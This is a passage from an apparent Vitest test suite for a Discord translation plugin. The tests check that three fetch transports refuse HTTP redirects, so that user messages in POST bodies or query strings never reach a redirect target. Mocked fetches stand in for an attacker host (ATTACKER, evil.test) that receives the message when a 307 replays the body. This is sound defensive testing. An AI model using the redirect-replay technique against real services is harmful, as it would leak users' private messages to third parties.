 * Anything landing in `delivered` reached the other origin. On the "follow" branch
 * that push models what a real runtime does BEFORE returning: it replays the
 * request at the redirect target, body and URL included, and only then resolves.
 *
 * @param manualShape which runtime's manual-redirect response to hand back:
 *   "browser" the Fetch standard's opaque-redirect filtered response (status 0)
 *   "node"    undici / Electron main: the real 307, url intact
 *   "gm"      GM_fetch resolving the raw GM_xmlhttpRequest response
 *   "ignored" a runtime that does not implement the option and follows anyway
 */
function redirectingFetch(
    manualShape: "browser" | "node" | "gm" | "ignored",
    delivered: { url: string; body?: string; }[]
) {
    return vi.fn(async (url: string, init?: any) => {
        const mode = init?.redirect ?? "follow";

        if (mode === "follow" || manualShape === "ignored") {
            // What a real runtime does: the request is REPLAYED at the target — a
            // 307/308 with the body, a 301/302/303 with the URL — and only then is
            // there a response to inspect.
            delivered.push({ url: ATTACKER, body: init?.body });
            return okResponse(ATTACKER);
        }

        if (manualShape === "browser") {
            return { url: "", status: 0, type: "opaqueredirect", text: async () => "", headers: { get: () => null } };
        }
        if (manualShape === "node") {
            return { url, status: 307, type: "default", text: async () => "", headers: { get: () => null } };
        }
        // GM_fetch resolves the raw GM_xmlhttpRequest response: finalUrl, no url.
        return { finalUrl: url, status: 307, text: async () => "", headers: { get: () => null } };
    });
}

describe("redirects are refused before the request is delivered", () => {
    let hostListener: (m: any, s: any, respond: (r: any) => void) => unknown;

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("IS_EXTENSION", false);
        vi.stubGlobal("chrome", {
            runtime: { onMessage: { addListener: (l: any) => { hostListener = l; } } }
        });
        await import("../browser/translationHost.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    async function ask(which: keyof typeof TRANSPORTS, url: string, init?: unknown): Promise<any> {
        if (which === "native.ts") {
            const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
            return fetchTranslation({} as any, url, init as any);
        }
        if (which === "translationHost.js") {
            return new Promise<any>(resolve => {
                hostListener({ action: "discordTranslator:fetch", url, init }, null, resolve);
            });
        }
        const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
        return ChannelTranslatorHelper.fetchTranslation(url, init as any);
    }

    const NAMES = Object.keys(TRANSPORTS) as (keyof typeof TRANSPORTS)[];
    const SHAPES = ["browser", "node", "gm"] as const;

    /*
     * Which refusal each shape earns, now that 3xx is read by status rather than
     * treated as one category. redirectingFetch() answers with a 307 — the
     * body-replaying half — so the two runtimes that DESCRIBE the redirect name
     * the replay rule, and the one that hands back an opaque-redirect response
     * cannot see a status at all and names that instead.
     *
     * The mapping is spelled out rather than folded into one string, because
     * "every 3xx produces the same refusal" is precisely the behaviour that has
     * been replaced and a shared expectation would not notice its return.
     */
    const REFUSAL_FOR: Record<typeof SHAPES[number], string> = {
        browser: REDIRECT_OPAQUE_REFUSAL,
        node: REDIRECT_REPLAY_REFUSAL,
        gm: REDIRECT_REPLAY_REFUSAL
    };

    // Every transport must handle every shape. Which runtime a transport actually
    // runs on is not something these files get to assume — Electron's main-process
    // fetch has been both Chromium's and Node's across versions, and the userscript
    // build swaps fetch out entirely — so the helper is identical in all three and
    // is tested against all three shapes rather than one each.
    for (const which of NAMES) {
        for (const shape of SHAPES) {
            it(`${which} refuses a ${shape}-shaped redirect on a POST, and the target receives NOTHING`, async () => {
                const delivered: { url: string; body?: string; }[] = [];
                vi.stubGlobal("fetch", redirectingFetch(shape, delivered));

                const res = await ask(which, ALLOWED, { method: "POST", body: SECRET_BODY });

                // The assertion that matters. The old guard passed the status test
                // below while this array held the user's message.
                expect(delivered, "the redirect target must have received nothing").toEqual([]);
                expect(res.status).toBe(0);
                expect(res.body).toBe(`blocked: ${REFUSAL_FOR[shape]}`);
                expect(res.body).not.toContain(SECRET);
            });

            it(`${which} refuses a ${shape}-shaped redirect on a GET, and the query string does not travel`, async () => {
                // The half the earlier review missed. core/providers/google.ts builds
                // `...&q=${encodeURIComponent(text)}`, so for the free provider the
                // message IS the URL and a replayed GET is a full disclosure.
                const delivered: { url: string; body?: string; }[] = [];
                vi.stubGlobal("fetch", redirectingFetch(shape, delivered));

                const res = await ask(which, SECRET_GET_URL);

                expect(delivered, "the redirect target must have received nothing").toEqual([]);
                expect(res.status).toBe(0);
                expect(res.body).toBe(`blocked: ${REFUSAL_FOR[shape]}`);
            });
        }

        it(`${which} asks for redirect: "manual" on a POST`, async () => {
            const fetchMock = vi.fn(async (u: string) => okResponse(u));
            vi.stubGlobal("fetch", fetchMock);

            await ask(which, ALLOWED, { method: "POST", body: SECRET_BODY });
            expect(fetchMock.mock.calls[0][1]).toMatchObject({ redirect: "manual" });
        });

        it(`${which} asks for redirect: "manual" on a GET too`, async () => {
            // The GET used to be spelled `fetch(href)` with no init at all in
            // translationBridge.ts, which is how the free provider — the one whose
            // URL carries the message — ended up the least protected of the three.
            const fetchMock = vi.fn(async (u: string) => okResponse(u));
            vi.stubGlobal("fetch", fetchMock);

            await ask(which, SECRET_GET_URL);
            expect(fetchMock.mock.calls[0][1]).toMatchObject({ redirect: "manual" });
        });

        it(`${which} still returns a normal 200 unchanged (positive control)`, async () => {
            // Without this, a transport that refused EVERYTHING would pass every
            // assertion above while breaking translation entirely.
            const delivered: { url: string; body?: string; }[] = [];
            vi.stubGlobal("fetch", vi.fn(async (u: string) => {
                delivered.push({ url: u });
                return okResponse(u);
            }));

            const res = await ask(which, ALLOWED, { method: "POST", body: SECRET_BODY });
            expect(res.status).toBe(200);
            expect(res.body).toBe("ok");
            expect(delivered).toHaveLength(1);
        });

        it(`${which} — when the runtime IGNORES the option, the body HAS already gone (residual, documented)`, async () => {
            // Not a passing grade: this is the exposure that remains, written down
            // so it cannot be quietly re-described as protection.
            //
            // This is the NORMAL case for the userscript build. GM_fetch in
            // browser/GMPolyfill.js hands its options to GM_xmlhttpRequest, which
            // implements `redirect` only in Tampermonkey; Violentmonkey and
            // Greasemonkey ignore the key and follow the redirect. When that
            // happens the request is already delivered and the transport can only
            // withhold the RESPONSE — which is exactly what the old guard did while
            // claiming more.
            const delivered: { url: string; body?: string; }[] = [];
            vi.stubGlobal("fetch", redirectingFetch("ignored", delivered));

            const res = await ask(which, ALLOWED, { method: "POST", body: SECRET_BODY });

            // The leak really did happen...
            expect(delivered).toHaveLength(1);
            expect(delivered[0].body).toBe(SECRET_BODY);
            // ...and all the transport can do now is refuse the response, under a
            // name that does not claim the request was stopped.
            expect(res.status).toBe(0);
            expect(res.body).toMatch(/^blocked response origin:/);
            expect(res.body).not.toMatch(/^blocked after redirect:/);
        });
    }

    it("the fake fetch really does deliver when the mode is follow (negative control)", async () => {
        // The whole section rests on `delivered` being able to fill up. If this
        // never fired, every "the target received nothing" assertion above would be
        // passing vacuously — which is precisely how the original defect survived
        // its own test suite.
        const delivered: { url: string; body?: string; }[] = [];
        const f = redirectingFetch("browser", delivered);

        await f(ALLOWED, { method: "POST", body: SECRET_BODY });
        expect(delivered).toEqual([{ url: ATTACKER, body: SECRET_BODY }]);

        await f(ALLOWED, { method: "POST", body: SECRET_BODY, redirect: "manual" });
        expect(delivered, "manual must not add a second delivery").toHaveLength(1);
    });
});

// ---------------------------------------------------------------------------
// 3xx is not one thing: what the STATUS CODE decides.
// ---------------------------------------------------------------------------

/*
 * The section above pins "a redirect is not followed". This one pins the split
 * that lets a 3xx be followed at all without giving that up:
 *
 *   307 / 308        REPLAY the method and the body at the new origin. Refused
 *                    always — the message text would be delivered before any
 *                    check could run, which is the exfiltration reproduced over
 *                    real sockets at the bottom of this file.
 *   301 / 302 / 303  reissue as a GET WITHOUT the body. Followable ONCE, and only
 *                    to a Location that passes the same checkUrl() the original
 *                    URL went through.
 *
 * ⚠ THE FIXTURE HOSTS HERE ARE DELIBERATELY NOT THE APPS SCRIPT ONES ANY MORE, and
 * the reason is the point of the section that follows this one. These tests are
 * about the MANUAL branch — inspect the 3xx, validate the Location, reissue as a
 * bodiless GET — which is what every transport does for every host EXCEPT the one
 * FOLLOW_MODE_HOSTS names. script.google.com is now that one exception in the two
 * browser transports, so keying this battery on it would have tested the exception
 * three times and the general rule never. The pair below is two ordinary
 * allow-listed provider hosts, neither of which is in the follow-mode scope, so
 * every assertion here is about the RULE.
 *
 * Every assertion is about WHAT EACH HOP RECEIVED, not about what the caller was
 * told. A status-only assertion is the weak test that let the original defect
 * through, and it would be just as blind to a follow-up that carried the body.
 */

/**
 * A redirecting allow-listed host, and an allow-listed host to be redirected TO —
 * neither of them inside the follow-mode exception. Both are real endpoints out of
 * ALLOWED_HOSTS. The Cloud Translation host redirecting to DeepL is not something
 * that happens in production and does not need to be: what is under test is what a
 * transport does with a 3xx from a host it trusts.
 */
const MANUAL_EXEC = "https://translation.googleapis.com/language/translate/v2?key=k&hop=1";
const MANUAL_RESULT = "https://api.deepl.com/v2/translate?hop=2";
/** A second allow-listed URL, so "one hop only" is tested as a HOP rule, not a host rule. */
const MANUAL_SECOND = "https://api-free.deepl.com/v2/translate?hop=3";

it("the manual-branch fixtures are OUTSIDE the follow-mode exception (control)", () => {
    // Without this the whole battery below could be silently exercising the follow
    // branch, which is exactly the mistake this section was re-keyed to avoid. The
    // scope is read out of the source rather than imported, for the same reason
    // every other extraction here is: translationHost.js has no exports.
    const scope = extractHostSet("FOLLOW_MODE_HOSTS", NATIVE);
    expect(scope, "the predicate's scope must be extractable").not.toBeNull();

    for (const url of [MANUAL_EXEC, MANUAL_RESULT, MANUAL_SECOND]) {
        expect(scope!.includes(new URL(url).hostname), url).toBe(false);
        // ...and they must still be hosts the transports accept, or every test
        // below would be passing on the allow-list refusal rather than on the rule.
        expect(new URL(url).protocol, url).toBe("https:");
        expect(new URL(url).port, url).toBe("");
    }
});

interface Hop {
    url: string;
    method: string;
    body?: string;
    contentType?: string;
}

/**
 * A fetch that answers a scripted redirect CHAIN and records what every hop
 * received: its URL, its method, its body and its Content-Type.
 *
 * `chain` maps a URL to the redirect it answers with. A URL that is not in the
 * chain answers 200. Anything appearing in `hops` was contacted — on the "follow"
 * branch that models what a real runtime does BEFORE returning, including the
 * part that is the whole point of this section: a 307/308 is replayed with the
 * method and body intact, while a 301/302/303 is reissued as a bodiless GET.
 *
 * @param shape which runtime's manual-redirect response to hand back:
 *   "node"    undici / Electron main: the real 3xx, url and Location intact
 *   "gm"      GM_fetch resolving the raw GM_xmlhttpRequest response (finalUrl)
 *   "browser" the Fetch standard's opaque-redirect filtered response — status 0,
 *             NO headers, so no Location to read and no status to branch on
 */
function chainFetch(
    chain: Record<string, { status: number; location: string; }>,
    hops: Hop[],
    shape: "node" | "gm" | "browser" = "node"
) {
    const redirectResponse = (url: string, status: number, location: string) => {
        if (shape === "browser") {
            return { url: "", status: 0, type: "opaqueredirect", text: async () => "", headers: { get: () => null } };
        }
        const headers = { get: (n: string) => (n.toLowerCase() === "location" ? location : null) };
        if (shape === "gm") return { finalUrl: url, status, text: async () => "", headers };
        return { url, status, type: "default", text: async () => "", headers };
    };

    const run = async (url: string, init: any): Promise<any> => {
        hops.push({
            url,
            method: init?.method ?? "GET",
            body: init?.body,
            contentType: init?.headers?.["Content-Type"]
        });

        const step = chain[url];
        if (!step) return okResponse(url);

        if ((init?.redirect ?? "follow") === "manual") {
            return redirectResponse(url, step.status, step.location);
        }

        // The "follow" branch, modelling a real runtime: 307/308 replay the whole
        // request at the target, 301/302/303 reissue it as a GET with no body.
        return run(step.location, [307, 308].includes(step.status) ? init : { redirect: init?.redirect });
    };

    return vi.fn((url: string, init?: any) => run(url, init ?? {}));
}

describe("3xx is read by status: replays refused, GET-reissues followed once", () => {
    let hostListener: (m: any, s: any, respond: (r: any) => void) => unknown;

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("IS_EXTENSION", false);
        vi.stubGlobal("chrome", {
            runtime: { onMessage: { addListener: (l: any) => { hostListener = l; } } }
        });
        await import("../browser/translationHost.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    async function ask(which: keyof typeof TRANSPORTS, url: string, init?: unknown): Promise<any> {
        if (which === "native.ts") {
            const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
            return fetchTranslation({} as any, url, init as any);
        }
        if (which === "translationHost.js") {
            return new Promise<any>(resolve => {
                hostListener({ action: "discordTranslator:fetch", url, init }, null, resolve);
            });
        }
        const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
        return ChannelTranslatorHelper.fetchTranslation(url, init as any);
    }

    const NAMES = Object.keys(TRANSPORTS) as (keyof typeof TRANSPORTS)[];

    it("the chain fetch replays a 307 and does NOT replay a 302 (negative control)", async () => {
        // Everything below rests on this being a faithful model of a real client.
        // If the "follow" branch never delivered, every "the attacker received
        // nothing" assertion would pass vacuously; if it replayed the body on a
        // 302 as well, the distinction under test would not exist. The same two
        // facts are measured against real sockets at the bottom of this file —
        // this one only pins that the MOCK agrees with them.
        const replayed: Hop[] = [];
        await chainFetch({ [MANUAL_EXEC]: { status: 307, location: ATTACKER } }, replayed)(
            MANUAL_EXEC, { method: "POST", body: SECRET_BODY });
        expect(replayed.map(h => h.url)).toEqual([MANUAL_EXEC, ATTACKER]);
        expect(replayed[1].method, "a 307 replays the METHOD").toBe("POST");
        expect(replayed[1].body, "a 307 replays the BODY — this is the defect").toBe(SECRET_BODY);

        const reissued: Hop[] = [];
        await chainFetch({ [MANUAL_EXEC]: { status: 302, location: ATTACKER } }, reissued)(
            MANUAL_EXEC, { method: "POST", body: SECRET_BODY });
        expect(reissued.map(h => h.url)).toEqual([MANUAL_EXEC, ATTACKER]);
        expect(reissued[1].method, "a 302 reissues as a GET").toBe("GET");
        expect(reissued[1].body, "a 302 does NOT carry the body").toBeUndefined();
    });

    for (const which of NAMES) {
        for (const status of [307, 308]) {
            it(`${which} refuses a ${status} to an attacker, and the attacker receives NOTHING`, async () => {
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch({ [MANUAL_EXEC]: { status, location: ATTACKER } }, hops));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url), "only the provider may be contacted").toEqual([MANUAL_EXEC]);
                expect(JSON.stringify(hops), "the message text must not appear at any other hop")
                    .not.toContain(ATTACKER);
                expect(res.status).toBe(0);
                expect(res.body).toBe(`blocked: ${REDIRECT_REPLAY_REFUSAL}`);
                expect(res.body).not.toContain(SECRET);
            });

            it(`${which} refuses a ${status} even when the Location IS allow-listed`, async () => {
                // The refusal is about the STATUS, not about the target. A 307 to a
                // host we like still replays the body, and "the target is allowed"
                // is exactly the reasoning that would re-open the hole for the
                // Apps Script provider's convenience.
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch(
                    { [MANUAL_EXEC]: { status, location: MANUAL_RESULT } }, hops));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
                expect(res.body).toBe(`blocked: ${REDIRECT_REPLAY_REFUSAL}`);
            });
        }

        for (const shape of ["node", "gm"] as const) {
            for (const status of [301, 302, 303]) {
                it(`${which} follows a ${shape}-shaped ${status} to an allowed host ONCE, as a GET carrying NO body`, async () => {
                    const hops: Hop[] = [];
                    vi.stubGlobal("fetch", chainFetch(
                        { [MANUAL_EXEC]: { status, location: MANUAL_RESULT } }, hops, shape));

                    const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                    // Exactly two hops: the deployment, then where it sent us.
                    expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC, MANUAL_RESULT]);

                    // THE ASSERTION THIS SECTION EXISTS FOR. The second request must
                    // carry no body and must not describe one. A follow-up that
                    // forwarded either would hand the user's message to the redirect
                    // target — which is the 307 defect wearing a 302's status code.
                    expect(hops[1].method).toBe("GET");
                    expect(hops[1].body, "the follow-up GET must carry NO body").toBeUndefined();
                    expect(hops[1].contentType, "and must not forward the original Content-Type")
                        .toBeUndefined();
                    expect(JSON.stringify(hops[1])).not.toContain(SECRET);

                    // And the caller gets the translation, which is the whole point.
                    expect(res.status).toBe(200);
                    expect(res.body).toBe("ok");
                });
            }

            it(`${which} refuses a ${shape}-shaped 302 to a host that is NOT allow-listed`, async () => {
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch(
                    { [MANUAL_EXEC]: { status: 302, location: ATTACKER } }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url), "the attacker origin must receive NOTHING")
                    .toEqual([MANUAL_EXEC]);
                expect(res.status).toBe(0);
                expect(res.body).toBe(`blocked: ${REDIRECT_REFUSAL}`);
                // The Location is third-party text and is never echoed back.
                expect(res.body).not.toContain("evil.test");
            });

            it(`${which} refuses a ${shape}-shaped 302 to an allowed host on another port`, async () => {
                // The Location goes through the SAME checkUrl() as the original URL,
                // so every rule that check enforces applies to it — port included.
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch(
                    { [MANUAL_EXEC]: { status: 302, location: NON_DEFAULT_PORT } }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
                expect(res.body).toBe(`blocked: ${REDIRECT_REFUSAL}`);
            });

            it(`${which} refuses a ${shape}-shaped 302 that carries credentials in the Location`, async () => {
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch(
                    { [MANUAL_EXEC]: { status: 302, location: CREDENTIALED } }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
                expect(res.body).toBe(`blocked: ${REDIRECT_REFUSAL}`);
                expect(res.body).not.toContain("pass");
            });

            it(`${which} refuses a ${shape}-shaped 302 with no Location at all`, async () => {
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch(
                    { [MANUAL_EXEC]: { status: 302, location: "" } }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
                expect(res.body).toBe(`blocked: ${REDIRECT_REFUSAL}`);
            });

            it(`${which} refuses a SECOND ${shape}-shaped redirect, even to an allowed host`, async () => {
                // One hop, and one only. The second target here is allow-listed, so
                // nothing but the hop rule can refuse it — which is what makes this
                // a test of the hop rule rather than of the host check again.
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch({
                    [MANUAL_EXEC]: { status: 302, location: MANUAL_RESULT },
                    [MANUAL_RESULT]: { status: 302, location: MANUAL_SECOND }
                }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC, MANUAL_RESULT]);
                expect(res.status).toBe(0);
                expect(res.body).toBe(`blocked: ${REDIRECT_HOP_REFUSAL}`);
            });

            it(`${which} refuses a SECOND ${shape}-shaped redirect that points at an attacker`, async () => {
                const hops: Hop[] = [];
                vi.stubGlobal("fetch", chainFetch({
                    [MANUAL_EXEC]: { status: 302, location: MANUAL_RESULT },
                    [MANUAL_RESULT]: { status: 307, location: ATTACKER }
                }, hops, shape));

                const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                expect(hops.map(h => h.url), "the attacker origin must receive NOTHING")
                    .toEqual([MANUAL_EXEC, MANUAL_RESULT]);
                expect(res.body).toBe(`blocked: ${REDIRECT_HOP_REFUSAL}`);
            });

            for (const status of [300, 305, 399]) {
                it(`${which} refuses a ${shape}-shaped ${status}, which is neither half of the split`, async () => {
                    const hops: Hop[] = [];
                    vi.stubGlobal("fetch", chainFetch(
                        { [MANUAL_EXEC]: { status, location: MANUAL_RESULT } }, hops, shape));

                    const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

                    expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
                    expect(res.body).toBe(`blocked: ${REDIRECT_OPAQUE_REFUSAL}`);
                });
            }
        }

        it(`${which} CANNOT follow a 302 when the runtime hands back an opaque redirect`, async () => {
            // Not a hypothetical branch and not a passing grade: this is what an
            // extension background context and a plain-web page fetch actually
            // receive for EVERY 3xx. status 0, no headers, no Location — so the
            // status split cannot be applied and the only fail-closed answer is to
            // refuse. The consequence is written down rather than papered over: the
            // Apps Script provider does not work in those two builds.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [MANUAL_EXEC]: { status: 302, location: MANUAL_RESULT } }, hops, "browser"));

            const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

            expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC]);
            expect(res.status).toBe(0);
            expect(res.body).toBe(`blocked: ${REDIRECT_OPAQUE_REFUSAL}`);
        });

        it(`${which} asks for redirect: "manual" on the FOLLOW-UP request too`, async () => {
            // Otherwise the second hop would be free to redirect onward under the
            // default "follow", and the one-hop rule would be advice.
            const hops: Hop[] = [];
            const fetchMock = chainFetch(
                { [MANUAL_EXEC]: { status: 302, location: MANUAL_RESULT } }, hops);
            vi.stubGlobal("fetch", fetchMock);

            await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

            expect(fetchMock.mock.calls).toHaveLength(2);
            expect(fetchMock.mock.calls[1][1]).toMatchObject({ redirect: "manual" });
        });

        it(`${which} sends the CHECKED href on the follow-up, not the raw Location`, async () => {
            // Same validate-one-thing-send-another gap the original URL closed by
            // fetching checkUrl()'s output. The Location is third-party text, so it
            // matters more here, not less.
            const RAW_LOCATION = "https://script.googleusercontent.com/macros/echo?k=it's";
            const NORMALISED_LOCATION = "https://script.googleusercontent.com/macros/echo?k=it%27s";
            expect(RAW_LOCATION, "control: the two fixtures must differ").not.toBe(NORMALISED_LOCATION);
            expect(new URL(RAW_LOCATION).href).toBe(NORMALISED_LOCATION);

            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [MANUAL_EXEC]: { status: 302, location: RAW_LOCATION } }, hops));

            await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

            expect(hops.map(h => h.url)).toEqual([MANUAL_EXEC, NORMALISED_LOCATION]);
        });

        it(`${which} follows a 302 on a GET without re-sending the query as a body`, async () => {
            // The free gtx provider's message text lives in the QUERY STRING. A
            // followed redirect on that verb is only safe because the target was
            // checked; this pins that the follow-up is still a plain GET.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", chainFetch(
                { [SECRET_GET_URL]: { status: 302, location: MANUAL_RESULT } }, hops));

            const res = await ask(which, SECRET_GET_URL);

            expect(hops.map(h => h.url)).toEqual([SECRET_GET_URL, MANUAL_RESULT]);
            expect(hops[1].method).toBe("GET");
            expect(hops[1].body).toBeUndefined();
            expect(res.status).toBe(200);
        });

        it(`${which} still refuses a 302 whose target is fine but whose LANDING is not`, async () => {
            // The response-origin backstop did not go away. Here the Location is
            // allow-listed, the hop is made, and the response then claims to have
            // come from somewhere else — a runtime that followed something further
            // on its own. Refused, under the name that does not pretend the
            // request was stopped.
            const hops: Hop[] = [];
            vi.stubGlobal("fetch", vi.fn(async (url: string, init?: any) => {
                hops.push({ url, method: init?.method ?? "GET", body: init?.body });
                if (url === MANUAL_EXEC) {
                    return {
                        url,
                        status: 302,
                        type: "default",
                        text: async () => "",
                        headers: { get: (n: string) => (n.toLowerCase() === "location" ? MANUAL_RESULT : null) }
                    };
                }
                return okResponse(ATTACKER);
            }));

            const res = await ask(which, MANUAL_EXEC, { method: "POST", body: SECRET_BODY });

            expect(res.status).toBe(0);
            expect(res.body).toMatch(/^blocked response origin:/);
        });
    }
});

// ---------------------------------------------------------------------------
// The Apps Script follow-mode exception: its scope, its landing check, and what
// it gives up.
// ---------------------------------------------------------------------------

/*
 * WHAT CHANGED AND WHY, because the previous round got this wrong in a way that
 * reads plausibly.
 *
 * It concluded that a browser "cannot" use an Apps Script deployment, because a
 * `redirect: "manual"` fetch answers a 3xx with an opaque-redirect response —
 * status 0, no headers, no Location — so the 302 that /exec ALWAYS returns could
 * not be classified and had to be refused. Every word of that is true about
 * `manual`, and the conclusion drawn from it was false: measured in real headless
 * Chromium against a local 302,
 *
 *     fetch(u, { method: "POST", body: SECRET, redirect: "manual" })
 *         -> status 0, type "opaqueredirect", location null, 0 readable headers
 *     fetch(u, { method: "POST", body: SECRET })      // i.e. redirect: "follow"
 *         -> status 200, landed on the redirect target
 *         -> and the TARGET SERVER RECORDED { "method": "GET", "body": "" }
 *
 * The browser follows the hop perfectly well; it just will not let us look at it.
 * The last line is the security fact the exception rests on, and it is re-measured
 * over real sockets at the bottom of this file rather than cited: a 302 reissues
 * as GET and the body does not travel. The attack the earlier round demonstrated
 * used a 307, which DOES replay the body — and 307/308 stay refused everywhere.
 *
 * So: one host, script.google.com, is fetched with `redirect: "follow"` in the two
 * transports whose runtime cannot describe a redirect, and the response is then
 * refused unless it LANDED on script.google.com or script.googleusercontent.com.
 * Everything else keeps `redirect: "manual"` and the inspect-then-follow path.
 *
 * The assertions below are about what the fetch was ASKED for and what each hop
 * RECEIVED, never only about what the caller was told — a status-only assertion is
 * the weak test that let the original redirect defect through.
 */

/** The user's own deployment, and the host its result is actually served from. */
const APPS_SCRIPT_EXEC = "https://script.google.com/macros/s/AKfycbEXAMPLEDEPLOYMENT/exec";
const APPS_SCRIPT_RESULT = "https://script.googleusercontent.com/macros/echo?user_content_key=opaque";
/**
 * ALLOW-LISTED, and OUTSIDE the follow-mode landing scope. This is the fixture that
 * makes the landing check a real narrowing rather than a second spelling of
 * ALLOWED_HOSTS: a follow-mode response that ends here is refused even though the
 * host is a provider the transports otherwise talk to happily.
 */
const OUT_OF_SCOPE_ALLOWED = "https://api.deepl.com/v2/translate";

const FOLLOW_LANDING_REFUSAL = "refused a followed redirect that landed off the Apps Script hosts";

/**
 * Which redirect mode each transport asks for when the URL is the Apps Script host.
 *
 * NOT the same in all three, and that is the design rather than drift. native.ts
 * runs in the Electron main process on Node/undici, which hands back the real 302
 * WITH its Location — so it keeps the strictly stronger inspect-then-follow path,
 * which refuses a 307 BEFORE the body flies. The two browser transports cannot see
 * the hop at all, and for them follow mode is the difference between a working
 * provider and no provider. The table is spelled out per transport so that a copy
 * flipping RUNTIME_DESCRIBES_REDIRECTS fails here loudly.
 */
const APPS_SCRIPT_MODE: Record<keyof typeof TRANSPORTS, "manual" | "follow"> = {
    "native.ts": "manual",
    "translationHost.js": "follow",
    "translationBridge.ts": "follow"
};

/** The two that take the exception, and the one that does not. */
const FOLLOWERS = ["translationHost.js", "translationBridge.ts"] as const;

describe("the follow-mode exception is pinned in the source of all three transports", () => {
    it("extracts a Set literal, and returns nothing for a symbol that is absent (controls)", () => {
        // Without the negative control an extractor that silently matched nothing
        // would make every comparison in this describe pass vacuously.
        expect(extractHostSet("FOLLOW_MODE_HOSTS", NATIVE)).not.toBeNull();
        expect(extractHostSet("NOT_A_REAL_SYMBOL", NATIVE)).toBeNull();
    });

    it("FOLLOW_MODE_HOSTS is exactly script.google.com in all three", () => {
        // The scope of the exception. One host. If this list ever grows, the
        // reasoning written above FOLLOW_MODE_HOSTS — "the host is already the
        // intended recipient of that body" — stops being true of the new entry.
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractHostSet("FOLLOW_MODE_HOSTS", path), label).toEqual(["script.google.com"]);
        }
    });

    it("FOLLOW_LANDING_HOSTS is exactly the two Apps Script hosts in all three", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractHostSet("FOLLOW_LANDING_HOSTS", path), label)
                .toEqual(["script.google.com", "script.googleusercontent.com"]);
        }
    });

    it("the landing scope is a STRICT subset of the allow-list (control)", () => {
        // The point of the narrower set. If it ever equalled ALLOWED_HOSTS the
        // landing check would be a second spelling of the host check, and every
        // "refused a landing on an allowed host" test below would be vacuous.
        const allowed = extractHostSet("ALLOWED_HOSTS", NATIVE);
        const landing = extractHostSet("FOLLOW_LANDING_HOSTS", NATIVE);
        expect(allowed, "the allow-list must be extractable").not.toBeNull();
        expect(landing!.every(h => allowed!.includes(h))).toBe(true);
        expect(landing!.length).toBeLessThan(allowed!.length);
    });

    it("RUNTIME_DESCRIBES_REDIRECTS is true ONLY in native.ts", () => {
        // The one line that differs between the three copies. A copy-paste that
        // carried native.ts's value into a browser transport would silently turn
        // the Apps Script provider back off in that build; one that carried a
        // browser value into native.ts would silently give up the desktop's
        // inspect-then-follow path. Both are caught here.
        expect(extractConst("RUNTIME_DESCRIBES_REDIRECTS", NATIVE)).toBe("true");
        expect(extractConst("RUNTIME_DESCRIBES_REDIRECTS", HOST)).toBe("false");
        expect(extractConst("RUNTIME_DESCRIBES_REDIRECTS", BRIDGE)).toBe("false");
    });

    it("FOLLOW_LANDING_REFUSAL is spelled identically in all three", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractConst("FOLLOW_LANDING_REFUSAL", path), label)
                .toBe(JSON.stringify(FOLLOW_LANDING_REFUSAL));
        }
    });

    it("the landing refusal is a DIFFERENT string from the other four (control)", () => {
        const all = [
            REDIRECT_REFUSAL, REDIRECT_REPLAY_REFUSAL, REDIRECT_OPAQUE_REFUSAL,
            REDIRECT_HOP_REFUSAL, FOLLOW_LANDING_REFUSAL
        ];
        expect(new Set(all).size).toBe(all.length);
    });

    it("every transport still asks for redirect: manual at least twice, and for follow once", () => {
        // The exception must not have cost the general control. Two occurrences of
        // the manual option is also what scripts/checkExtensionPackages.mjs requires
        // of the SHIPPED translationHost.js — the POST and the GET — so a collapsed
        // manual branch fails here rather than at packaging time.
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            const text = source(path);
            expect(text.split('redirect: "manual"').length - 1, label).toBeGreaterThanOrEqual(2);
